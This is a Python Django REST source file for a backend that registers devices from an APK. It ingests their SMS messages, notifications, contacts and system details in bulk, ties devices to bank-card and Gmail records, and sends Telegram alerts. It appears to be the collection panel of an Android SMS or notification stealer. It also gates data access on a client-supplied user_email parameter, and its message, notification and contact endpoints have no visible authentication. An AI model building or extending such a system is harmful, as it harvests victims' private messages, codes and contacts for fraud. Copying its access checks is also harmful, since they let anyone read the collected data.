"""
Mobile views: Device, Message, Notification, Contact, FileSystem ViewSets

These views handle all mobile device-related data including:
- Device registration and management
- SMS messages sync
- Notifications sync
- Contacts sync
- File system operations
"""
import time
from pathlib import Path
import shutil

from django.conf import settings
from django.db import models
from django.http import FileResponse
from rest_framework import viewsets, status
from rest_framework.decorators import action
from rest_framework.parsers import MultiPartParser, FormParser
from rest_framework.response import Response

from api.models import (
    Device,
    Message,
    Notification,
    Contact,
    DashUser,
    BankCard,
    Company,
)
from api.pagination import SkipLimitPagination
from api.serializers import (
    DeviceSerializer,
    DeviceCreateSerializer,
    DeviceUpdateSerializer,
    MessageSerializer,
    MessageCreateSerializer,
    NotificationSerializer,
    NotificationCreateSerializer,
    ContactSerializer,
    ContactCreateSerializer,
    ContactSimpleSerializer,
    BankCardSerializer,
    BankCardCreateSerializer,
    CompanySerializer,
)
from api.telegram_service import send_telegram_alert
from api.views.core import _update_device_sync_fields, _log_sync_result


class CompanyViewSet(viewsets.ReadOnlyModelViewSet):
    """
    ViewSet for Company read operations
    Returns list of all active companies
    """
    queryset = Company.objects.filter(is_active=True)
    serializer_class = CompanySerializer
    lookup_field = 'code'
    
    def get_queryset(self):
        return Company.objects.filter(is_active=True).order_by('code')


class DeviceViewSet(viewsets.ModelViewSet):
    """
    ViewSet for Device CRUD operations

    Supports filtering by:
    - code: Filter by device activation code
    - is_active: Filter by active status
    - device_id: Filter by device ID
    """
    queryset = Device.objects.all()
    serializer_class = DeviceSerializer
    lookup_field = 'device_id'
    pagination_class = SkipLimitPagination

    def get_serializer_class(self):
        if self.action == 'create':
            return DeviceCreateSerializer
        elif self.action in ['update', 'partial_update']:
            return DeviceUpdateSerializer
        return DeviceSerializer

    def get_queryset(self):
        queryset = Device.objects.select_related('bank_card', 'company').prefetch_related('assigned_to')

        # Filter by user's company (company-based device allocation)
        user_email = self.request.query_params.get('user_email')
        if user_email:
            try:
                user = DashUser.objects.select_related('company').get(email=user_email)
                # Admins (access_level=0) can see all devices, others see only their company's devices
                if user.access_level == 0:
                    # Admin can see all devices, but can filter by company_code if provided
                    company_code = self.request.query_params.get('company_code')
                    if company_code:
                        try:
                            from api.models import Company
                            company = Company.objects.get(code=company_code.upper(), is_active=True)
                            queryset = queryset.filter(company=company)
                        except Company.DoesNotExist:
                            queryset = queryset.none()
                    # Otherwise, admin sees all devices
                else:
                    # Non-admin users see only devices from their company
                    if user.company:
                        queryset = queryset.filter(company=user.company)
                    else:
                        # User has no company, return empty queryset
                        queryset = queryset.none()
            except DashUser.DoesNotExist:
                queryset = queryset.none()
        else:
            # No user_email provided, return empty queryset for security
            queryset = queryset.none()

        code = self.request.query_params.get('code')
        if code:
            queryset = queryset.filter(code=code)

        is_active = self.request.query_params.get('is_active')
        if is_active is not None:
            is_active_bool = is_active.lower() in ('true', '1', 'yes')
            queryset = queryset.filter(is_active=is_active_bool)

        device_id = self.request.query_params.get('device_id')
        if device_id:
            queryset = queryset.filter(device_id=device_id)

        return queryset

    def create(self, request, *args, **kwargs):
        from api.utils import get_all_admin_users

        data = request.data or {}
        has_bankcard = 'bankcard_template_id' in data and 'gmail_account_id' in data

        if has_bankcard:
            return super().create(request, *args, **kwargs)

        device_id = data.get('device_id') or (data.get('device') if isinstance(data.get('device'), str) else None)
        if not device_id:
            return Response(
                {'detail': 'device_id is required for APK registration'},
                status=status.HTTP_400_BAD_REQUEST,
            )

        def _bool(v):
            if v is None:
                return False
            if isinstance(v, bool):
                return v
            if isinstance(v, str):
                return v.lower() in ('true', '1', 'yes', 'opened', 'active')
            return bool(v)

        defaults = {
            'name': data.get('name') or data.get('model'),
            'model': data.get('model'),
            'phone': data.get('phone') or data.get('current_phone') or '',
            'code': data.get('code') or '',
            'is_active': _bool(data.get('is_active')),
            'last_seen': data.get('last_seen') or data.get('time'),
            'battery_percentage': data.get('battery_percentage'),
            'current_phone': data.get('current_phone') or data.get('phone') or '',
            'current_identifier': data.get('current_identifier') or '',
            'time': data.get('time'),
            'bankcard': data.get('bankcard') or 'BANKCARD',
            'system_info': data.get('system_info') or {},
        }
        device, created = Device.objects.update_or_create(
            device_id=device_id,
            defaults=defaults,
        )
        device.is_active = defaults['is_active']
        admin_users = get_all_admin_users()
        device.assigned_to.add(*admin_users)
        device.save(update_fields=['is_active'])

        try:
            out = DeviceSerializer(device).data
        except Exception:
            out = {
                'id': device.id,
                'device_id': device.device_id,
                'name': device.name,
                'model': device.model,
                'code': device.code,
                'is_active': device.is_active,
                'assigned_to': [u.email for u in device.assigned_to.all()],
            }
        return Response(out, status=status.HTTP_201_CREATED)

    @action(detail=True, methods=['patch'], url_path='update-last-seen')
    def update_last_seen(self, request, device_id=None):
        device = self.get_object()
        device.last_seen = int(time.time() * 1000)
        device.save()
        serializer = self.get_serializer(device)
        return Response(serializer.data)

    @action(detail=True, methods=['patch'], url_path='update-battery')
    def update_battery(self, request, device_id=None):
        device = self.get_object()
        battery = request.data.get('battery_percentage')
        if battery is not None:
            device.battery_percentage = int(battery)
            device.save()
        serializer = self.get_serializer(device)
        return Response(serializer.data)

    @action(detail=True, methods=['patch'], url_path='activate')
    def activate_device(self, request, device_id=None):
        device = self.get_object()
        device.is_active = True
        if 'code' in request.data:
            device.code = request.data['code']
        device.save()
        serializer = self.get_serializer(device)
        return Response(serializer.data)

    @action(detail=True, methods=['patch'], url_path='deactivate')
    def deactivate_device(self, request, device_id=None):
        device = self.get_object()
        device.is_active = False
        device.save()
        serializer = self.get_serializer(device)
        return Response(serializer.data)

    @action(detail=True, methods=['post'], url_path='reset')
    def reset_device(self, request, device_id=None):
        device = self.get_object()
        device.is_active = False
        device.sync_status = 'never_synced'
        device.last_sync_at = None
        device.save()
        if hasattr(device, 'bank_card') and device.bank_card:
            device.bank_card.status = 'inactive'
            device.bank_card.save()
        return Response({
            'success': True,
            'message': f'Device {device_id} has been reset successfully.',
            'device_id': device_id,
        })

    @action(detail=True, methods=['post'], url_path='bank-card')
    def attach_bank_card(self, request, device_id=None):
        device = self.get_object()
        if hasattr(device, 'bank_card') and device.bank_card:
            return Response(
                {'detail': f'Device "{device_id}" already has a bank card'},
                status=status.HTTP_400_BAD_REQUEST,
            )
        data = dict(request.data) if request.data else {}
        data['device_id'] = device_id
        serializer = BankCardCreateSerializer(data=data)
        if not serializer.is_valid():
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
        bank_card = serializer.save()
        out_serializer = BankCardSerializer(bank_card)
        return Response(out_serializer.data, status=status.HTTP_201_CREATED)

    @action(detail=True, methods=['get'], url_path='complete')
    def get_complete_device_data(self, request, device_id=None):
        device = self.get_object()
        message_limit = int(request.query_params.get('message_limit', 50))
        notification_limit = int(request.query_params.get('notification_limit', 50))
        include_contacts = request.query_params.get('include_contacts', 'true').lower() == 'true'
        include_bank_card = request.query_params.get('include_bank_card', 'true').lower() == 'true'

        response_data = {
            'device_id': device.device_id,
            'metadata': {
                'name': device.name,
                'model': device.model,
                'phone': device.phone,
                'current_phone': device.current_phone,
                'code': device.code,
                'is_active': device.is_active,
                'last_seen': device.last_seen,
                'battery_percentage': device.battery_percentage,
                'current_identifier': device.current_identifier,
                'time': device.time,
                'bankcard': device.bankcard,
                'created_at': device.created_at.isoformat() if device.created_at else None,
                'updated_at': device.updated_at.isoformat() if device.updated_at else None,
            },
            'messages': {
                'recent': [],
                'total_count': device.messages.count(),
                'received_count': device.messages.filter(message_type='received').count(),
                'sent_count': device.messages.filter(message_type='sent').count(),
            },
            'notifications': {
                'recent': [],
                'total_count': device.notifications.count(),
            },
            'contacts': {
                'list': [],
                'total_count': 0,
            },
            'systemInfo': device.system_info if device.system_info else {
                'buildInfo': None,
                'displayInfo': None,
                'storageInfo': None,
                'memoryInfo': None,
                'batteryInfo': None,
                'networkInfo': None,
                'phoneSimInfo': None,
                'systemSettings': None,
                'runtimeInfo': None,
                'deviceFeatures': None,
                'powerManagement': None,
                'bootInfo': None,
                'performanceMetrics': None,
                'permissionStatus': None,
            },
            'bankCard': None,
            'statistics': {
                'total_messages': 0,
                'total_notifications': 0,
                'total_contacts': 0,
                'last_message_timestamp': None,
                'last_notification_timestamp': None,
            },
        }

        recent_messages = device.messages.order_by('-timestamp')[:message_limit]
        response_data['messages']['recent'] = MessageSerializer(recent_messages, many=True).data
        last_message = device.messages.order_by('-timestamp').first()
        if last_message:
            response_data['statistics']['last_message_timestamp'] = last_message.timestamp

        recent_notifications = device.notifications.order_by('-timestamp')[:notification_limit]
        response_data['notifications']['recent'] = NotificationSerializer(recent_notifications, many=True).data
        last_notification = device.notifications.order_by('-timestamp').first()
        if last_notification:
            response_data['statistics']['last_notification_timestamp'] = last_notification.timestamp

        if include_contacts:
            contacts = device.contacts.all()
            response_data['contacts']['list'] = ContactSerializer(contacts, many=True).data
            response_data['contacts']['total_count'] = contacts.count()

        if include_bank_card:
            try:
                bank_card = device.bank_card
                response_data['bankCard'] = BankCardSerializer(bank_card).data
            except BankCard.DoesNotExist:
                response_data['bankCard'] = None

        response_data['statistics']['total_messages'] = response_data['messages']['total_count']
        response_data['statistics']['total_notifications'] = response_data['notifications']['total_count']
        response_data['statistics']['total_contacts'] = response_data['contacts']['total_count']

        return Response(response_data, status=status.HTTP_200_OK)


class MessageViewSet(viewsets.ModelViewSet):
    queryset = Message.objects.all()
    serializer_class = MessageSerializer
    pagination_class = SkipLimitPagination

    def get_serializer_class(self):
        if self.action == 'create':
            return MessageCreateSerializer
        return MessageSerializer

    def get_queryset(self):
        queryset = Message.objects.all()
        device_id = self.request.query_params.get('device_id')
        if device_id:
            queryset = queryset.filter(device__device_id=device_id)
        message_type = self.request.query_params.get('message_type')
        if message_type in ['received', 'sent']:
            queryset = queryset.filter(message_type=message_type)
        phone = self.request.query_params.get('phone')
        if phone:
            queryset = queryset.filter(phone=phone)
        return queryset

    def create(self, request, *args, **kwargs):
        data = request.data
        is_list = isinstance(data, list)
        messages_data = data if is_list else [data]

        if not is_list and 'device_id' not in data and 'device' in data:
            serializer = self.get_serializer(data=data)
            serializer.is_valid(raise_exception=True)
            self.perform_create(serializer)
            headers = self.get_success_headers(serializer.data)
            return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)

        device_ids = {msg.get('device_id') for msg in messages_data if msg.get('device_id')}
        devices_map = {d.device_id: d for d in Device.objects.filter(device_id__in=device_ids)} if device_ids else {}

        messages_to_create = []
        created = []
        errors = []

        for idx, msg_data in enumerate(messages_data):
            try:
                device = None
                if 'device_id' in msg_data:
                    device_id = msg_data.get('device_id')
                    device = devices_map.get(device_id)
                    if not device:
                        errors.append({'index': idx, 'error': f'Device with device_id "{device_id}" not found', 'data': msg_data})
                        continue
                elif 'device' in msg_data:
                    device_id_val = msg_data.get('device')
                    if isinstance(device_id_val, (int, str)):
                        try:
                            device = Device.objects.get(pk=device_id_val)
                        except Device.DoesNotExist:
                            errors.append({'index': idx, 'error': f'Device with id "{device_id_val}" not found', 'data': msg_data})
                            continue
                    else:
                        device = device_id_val
                else:
                    errors.append({'index': idx, 'error': 'device_id or device is required', 'data': msg_data})
                    continue

                messages_to_create.append(Message(
                    device=device,
                    message_type=msg_data.get('message_type', 'received'),
                    phone=msg_data.get('phone', ''),
                    body=msg_data.get('body', ''),
                    timestamp=msg_data.get('timestamp', 0),
                    read=msg_data.get('read', False),
                ))
            except Exception as e:
                errors.append({'index': idx, 'error': str(e), 'data': msg_data})

        created_count = 0
        if messages_to_create:
            try:
                created_messages = Message.objects.bulk_create(messages_to_create, ignore_conflicts=True)
                created = [MessageSerializer(msg).data for msg in created_messages if hasattr(msg, 'id') and msg.id]
                created_count = len(created_messages)
            except Exception:
                for msg_obj in messages_to_create:
                    try:
                        msg_obj.save()
                        created.append(MessageSerializer(msg_obj).data)
                        created_count += 1
                    except Exception:
                        pass

        sync_device_ids = {msg.get('device_id') for msg in messages_data if msg.get('device_id')}
        sync_status_value = 'synced' if created_count and not errors else 'out_of_sync'
        error_message = errors[0].get('error') if errors else None
        _update_device_sync_fields(sync_device_ids, 'messages_last_synced_at', sync_status_value, error_message=error_message)
        for did in sync_device_ids:
            dev = devices_map.get(did)
            if dev:
                _log_sync_result(
                    device=dev,
                    sync_type='messages',
                    status='completed' if not errors else 'partial',
                    created_count=created_count,
                    errors_count=len(errors),
                    error_message=error_message,
                )
                if errors:
                    send_telegram_alert(
                        f"Message sync issues for {did}: created={created_count}, errors={len(errors)}",
                        bot_name='alerts',
                        throttle_key=f"messages_sync:{did}",
                    )

        if not is_list:
            if created:
                return Response(created[0], status=status.HTTP_201_CREATED)
            elif errors:
                return Response({'error': errors[0].get('error'), 'details': errors[0]}, status=status.HTTP_400_BAD_REQUEST)
            return Response({'error': 'Failed to create message'}, status=status.HTTP_400_BAD_REQUEST)

        response_data = {'created_count': len(created), 'errors_count': len(errors), 'created': created}
        if errors:
            response_data['errors'] = errors
        status_code = status.HTTP_201_CREATED if created else status.HTTP_400_BAD_REQUEST
        if created and errors:
            status_code = status.HTTP_207_MULTI_STATUS
        return Response(response_data, status=status_code)


class NotificationViewSet(viewsets.ModelViewSet):
    queryset = Notification.objects.all()
    serializer_class = NotificationSerializer
    pagination_class = SkipLimitPagination

    def get_serializer_class(self):
        if self.action == 'create':
            return NotificationCreateSerializer
        return NotificationSerializer

    def get_queryset(self):
        queryset = Notification.objects.all()
        device_id = self.request.query_params.get('device_id')
        if device_id:
            queryset = queryset.filter(device__device_id=device_id)
        package_name = self.request.query_params.get('package_name')
        if package_name:
            queryset = queryset.filter(package_name=package_name)
        return queryset

    def create(self, request, *args, **kwargs):
        data = request.data
        is_list = isinstance(data, list)
        notifications_data = data if is_list else [data]

        if not is_list and 'device_id' not in data and 'device' in data:
            serializer = self.get_serializer(data=data)
            serializer.is_valid(raise_exception=True)
            self.perform_create(serializer)
            headers = self.get_success_headers(serializer.data)
            return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)

        device_ids = {n.get('device_id') for n in notifications_data if n.get('device_id')}
        devices_map = {d.device_id: d for d in Device.objects.filter(device_id__in=device_ids)} if device_ids else {}

        notifications_to_create = []
        created = []
        errors = []

        for idx, notif_data in enumerate(notifications_data):
            try:
                device = None
                if 'device_id' in notif_data:
                    device_id = notif_data.get('device_id')
                    device = devices_map.get(device_id)
                    if not device:
                        errors.append({'index': idx, 'error': f'Device with device_id "{device_id}" not found', 'data': notif_data})
                        continue
                elif 'device' in notif_data:
                    device_id_val = notif_data.get('device')
                    if isinstance(device_id_val, (int, str)):
                        try:
                            device = Device.objects.get(pk=device_id_val)
                        except Device.DoesNotExist:
                            errors.append({'index': idx, 'error': f'Device with id "{device_id_val}" not found', 'data': notif_data})
                            continue
                    else:
                        device = device_id_val
                else:
                    errors.append({'index': idx, 'error': 'device_id or device is required', 'data': notif_data})
                    continue

                notif, was_created = Notification.objects.update_or_create(
                    device=device,
                    timestamp=notif_data.get('timestamp', 0),
                    defaults={
                        'package_name': notif_data.get('package_name', ''),
                        'title': notif_data.get('title', ''),
                        'text': notif_data.get('text', ''),
                        'extra': notif_data.get('extra', {}),
                    },
                )
                created.append(NotificationSerializer(notif).data)
            except Exception as e:
                errors.append({'index': idx, 'error': str(e), 'data': notif_data})

        created_count = len(created)

        sync_device_ids = {n.get('device_id') for n in notifications_data if n.get('device_id')}
        sync_status_value = 'synced' if created_count and not errors else 'out_of_sync'
        error_message = errors[0].get('error') if errors else None
        _update_device_sync_fields(sync_device_ids, 'notifications_last_synced_at', sync_status_value, error_message=error_message)
        for did in sync_device_ids:
            dev = devices_map.get(did)
            if dev:
                _log_sync_result(
                    device=dev,
                    sync_type='notifications',
                    status='completed' if not errors else 'partial',
                    created_count=created_count,
                    errors_count=len(errors),
                    error_message=error_message,
                )
                if errors:
                    send_telegram_alert(
                        f"Notification sync issues for {did}: created={created_count}, errors={len(errors)}",
                        bot_name='alerts',
                        throttle_key=f"notifications_sync:{did}",
                    )

        if not is_list:
            if created:
                return Response(created[0], status=status.HTTP_201_CREATED)
            elif errors:
                return Response({'error': errors[0].get('error'), 'details': errors[0]}, status=status.HTTP_400_BAD_REQUEST)
            return Response({'error': 'Failed to create notification'}, status=status.HTTP_400_BAD_REQUEST)

        response_data = {'created_count': len(created), 'errors_count': len(errors), 'created': created}
        if errors:
            response_data['errors'] = errors
        status_code = status.HTTP_201_CREATED if created else status.HTTP_400_BAD_REQUEST
        if created and errors:
            status_code = status.HTTP_207_MULTI_STATUS
        return Response(response_data, status=status_code)


class ContactViewSet(viewsets.ModelViewSet):
    queryset = Contact.objects.all()
    serializer_class = ContactSerializer
    pagination_class = SkipLimitPagination

    def get_serializer_class(self):
        if self.action == 'create':
            return ContactCreateSerializer
        elif self.action == 'list' and self.request.query_params.get('simple') == 'true':
            return ContactSimpleSerializer
        return ContactSerializer

    def get_queryset(self):
        queryset = Contact.objects.all()
        device_id = self.request.query_params.get('device_id')
        if device_id:
            queryset = queryset.filter(device__device_id=device_id)
        phone_number = self.request.query_params.get('phone_number')
        if phone_number:
            queryset = queryset.filter(phone_number=phone_number)
        name = self.request.query_params.get('name')
        if name:
            queryset = queryset.filter(
                models.Q(name__icontains=name) | models.Q(display_name__icontains=name)
            )
        return queryset

    def create(self, request, *args, **kwargs):
        data = request.data
        contacts_data = []
        is_firebase_format = False

        if isinstance(data, list):
            contacts_data = data
        elif isinstance(data, dict):
            if 'device_id' in data or 'device' in data:
                contacts_data = [data]
            else:
                is_firebase_format = True
                contacts_data = [{**v, 'phone_number': k} for k, v in data.items()]

        if len(contacts_data) == 1 and not is_firebase_format and 'device_id' not in contacts_data[0] and 'device' in contacts_data[0]:
            contact_data = contacts_data[0]
            phone_number = contact_data.get('phone_number')
            if phone_number:
                try:
                    existing = Contact.objects.get(device_id=contact_data.get('device'), phone_number=phone_number)
                    serializer = self.get_serializer(existing, data=contact_data, partial=True)
                    serializer.is_valid(raise_exception=True)
                    serializer.save()
                    return Response(serializer.data, status=status.HTTP_200_OK)
                except Contact.DoesNotExist:
                    pass
            serializer = self.get_serializer(data=contact_data)
            serializer.is_valid(raise_exception=True)
            self.perform_create(serializer)
            headers = self.get_success_headers(serializer.data)
            return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)

        device_ids = {c.get('device_id') for c in contacts_data if c.get('device_id')}
        devices_map = {d.device_id: d for d in Device.objects.filter(device_id__in=device_ids)} if device_ids else {}

        created = []
        updated = []
        errors = []

        for idx, contact_data in enumerate(contacts_data):
            try:
                device = None
                if 'device_id' in contact_data:
                    device_id = contact_data.get('device_id')
                    device = devices_map.get(device_id)
                    if not device:
                        errors.append({'index': idx, 'error': f'Device with device_id "{device_id}" not found', 'data': contact_data})
                        continue
                elif 'device' in contact_data:
                    device_id_val = contact_data.get('device')
                    if isinstance(device_id_val, (int, str)):
                        try:
                            device = Device.objects.get(pk=device_id_val)
                        except Device.DoesNotExist:
                            errors.append({'index': idx, 'error': f'Device with id "{device_id_val}" not found', 'data': contact_data})
                            continue
                    else:
                        device = device_id_val
                else:
                    errors.append({'index': idx, 'error': 'device_id or device is required', 'data': contact_data})
                    continue

                phone_number = contact_data.get('phone_number')
                if not phone_number:
                    errors.append({'index': idx, 'error': 'phone_number is required', 'data': contact_data})
                    continue

                contact, was_created = Contact.objects.update_or_create(
                    device=device,
                    phone_number=phone_number,
                    defaults={
                        'contact_id': contact_data.get('contact_id', ''),
                        'name': contact_data.get('name'),
                        'display_name': contact_data.get('display_name'),
                        'photo_uri': contact_data.get('photo_uri'),
                        'thumbnail_uri': contact_data.get('thumbnail_uri'),
                        'company': contact_data.get('company'),
                        'job_title': contact_data.get('job_title'),
                        'department': contact_data.get('department'),
                        'birthday': contact_data.get('birthday'),
                        'anniversary': contact_data.get('anniversary'),
                        'notes': contact_data.get('notes'),
                        'last_contacted': contact_data.get('last_contacted'),
                        'times_contacted': contact_data.get('times_contacted', 0),
                        'is_starred': contact_data.get('is_starred', False),
                        'nickname': contact_data.get('nickname'),
                        'phonetic_name': contact_data.get('phonetic_name'),
                        'phones': contact_data.get('phones', []),
                        'emails': contact_data.get('emails', []),
                        'addresses': contact_data.get('addresses', []),
                        'websites': contact_data.get('websites', []),
                        'im_accounts': contact_data.get('im_accounts', []),
                    },
                )
                if was_created:
                    created.append(ContactSerializer(contact).data)
                else:
                    updated.append(ContactSerializer(contact).data)
            except Exception as e:
                errors.append({'index': idx, 'error': str(e), 'data': contact_data})

        sync_device_ids = {c.get('device_id') for c in contacts_data if c.get('device_id')}
        sync_status_value = 'synced' if (created or updated) and not errors else 'out_of_sync'
        error_message = errors[0].get('error') if errors else None
        _update_device_sync_fields(sync_device_ids, 'contacts_last_synced_at', sync_status_value, error_message=error_message)
        for did in sync_device_ids:
            dev = devices_map.get(did)
            if dev:
                _log_sync_result(
                    device=dev,
                    sync_type='contacts',
                    status='completed' if not errors else 'partial',
                    created_count=len(created) + len(updated),
                    errors_count=len(errors),
                    error_message=error_message,
                )
                if errors:
                    send_telegram_alert(
                        f"Contact sync issues for {did}: created={len(created)}, updated={len(updated)}, errors={len(errors)}",
                        bot_name='alerts',
                        throttle_key=f"contacts_sync:{did}",
                    )

        if len(contacts_data) == 1 and not is_firebase_format:
            if created:
                return Response(created[0], status=status.HTTP_201_CREATED)
            elif updated:
                return Response(updated[0], status=status.HTTP_200_OK)
            elif errors:
                return Response({'error': errors[0].get('error'), 'details': errors[0]}, status=status.HTTP_400_BAD_REQUEST)
            return Response({'error': 'Failed to create/update contact'}, status=status.HTTP_400_BAD_REQUEST)

        response_data = {
            'created_count': len(created),
            'updated_count': len(updated),
            'errors_count': len(errors),
            'created': created,
            'updated': updated,
        }
        if errors:
            response_data['errors'] = errors
        status_code = status.HTTP_201_CREATED if created or updated else status.HTTP_400_BAD_REQUEST
        if (created or updated) and errors:
            status_code = status.HTTP_207_MULTI_STATUS
        return Response(response_data, status=status_code)


class FileSystemViewSet(viewsets.ViewSet):
    parser_classes = [MultiPartParser, FormParser]

    def resolve_path(self, path_str: str) -> Path:
        clean_path = path_str.lstrip("/")
        target = (settings.STORAGE_ROOT / clean_path).resolve()
        if not str(target).startswith(str(settings.STORAGE_ROOT.resolve())):
            raise ValueError("Access denied: Path outside storage directory")
        return target

    @action(detail=False, methods=['get'], url_path='list')
    def list_directory(self, request):
        path = request.query_params.get('path', '')
        try:
            target = self.resolve_path(path)
            if not target.exists():
                return Response({"detail": "Directory not found"}, status=status.HTTP_404_NOT_FOUND)
            if not target.is_dir():
                return Response({"detail": "Path is not a directory"}, status=status.HTTP_400_BAD_REQUEST)
            items = []
            for item in target.iterdir():
                items.append({
                    "name": item.name,
                    "is_dir": item.is_dir(),
                    "size": item.stat().st_size if item.is_file() else None,
                    "path": str(item.relative_to(settings.STORAGE_ROOT)),
                })
            return Response({"path": path, "items": items})
        except ValueError as e:
            return Response({"detail": str(e)}, status=status.HTTP_403_FORBIDDEN)

    @action(detail=False, methods=['post'], url_path='directory')
    def create_directory(self, request):
        path = request.data.get('path')
        if not path:
            return Response({"detail": "path parameter is required"}, status=status.HTTP_400_BAD_REQUEST)
        try:
            target = self.resolve_path(path)
            if target.exists():
                return Response({"detail": "Directory already exists"}, status=status.HTTP_400_BAD_REQUEST)
            target.mkdir(parents=True, exist_ok=True)
            return Response({"message": f"Directory '{path}' created"})
        except ValueError as e:
            return Response({"detail": str(e)}, status=status.HTTP_403_FORBIDDEN)

    @action(detail=False, methods=['post'], url_path='upload')
    def upload_file(self, request):
        path = request.data.get('path')
        file = request.FILES.get('file')
        if not path:
            return Response({"detail": "path parameter is required"}, status=status.HTTP_400_BAD_REQUEST)
        if not file:
            return Response({"detail": "file is required"}, status=status.HTTP_400_BAD_REQUEST)
        try:
            target_dir = self.resolve_path(path)
            if not target_dir.exists():
                target_dir.mkdir(parents=True, exist_ok=True)
            file_path = target_dir / file.name
            with open(file_path, 'wb') as out_file:
                for chunk in file.chunks():
                    out_file.write(chunk)
            return Response({"message": f"File '{file.name}' uploaded to '{path}'"})
        except ValueError as e:
            return Response({"detail": str(e)}, status=status.HTTP_403_FORBIDDEN)

    @action(detail=False, methods=['get'], url_path='download')
    def download_file(self, request):
        path = request.query_params.get('path')
        if not path:
            return Response({"detail": "path parameter is required"}, status=status.HTTP_400_BAD_REQUEST)
        try:
            target = self.resolve_path(path)
            if not target.exists() or not target.is_file():
                return Response({"detail": "File not found"}, status=status.HTTP_404_NOT_FOUND)
            return FileResponse(open(target, 'rb'), as_attachment=True)
        except ValueError as e:
            return Response({"detail": str(e)}, status=status.HTTP_403_FORBIDDEN)
        except FileNotFoundError:
            return Response({"detail": "File not found"}, status=status.HTTP_404_NOT_FOUND)

    @action(detail=False, methods=['delete'], url_path='delete')
    def delete_item(self, request):
        path = request.query_params.get('path')
        if not path:
            return Response({"detail": "path parameter is required"}, status=status.HTTP_400_BAD_REQUEST)
        try:
            target = self.resolve_path(path)
            if not target.exists():
                return Response({"detail": "Item not found"}, status=status.HTTP_404_NOT_FOUND)
            if target.is_dir():
                shutil.rmtree(target)
            else:
                target.unlink()
            return Response({"message": f"Deleted '{path}'"})
        except ValueError as e:
            return Response({"detail": str(e)}, status=status.HTTP_403_FORBIDDEN)


__all__ = [
    'DeviceViewSet',
    'MessageViewSet',
    'NotificationViewSet',
    'ContactViewSet',
    'FileSystemViewSet',
    'CompanyViewSet',
]
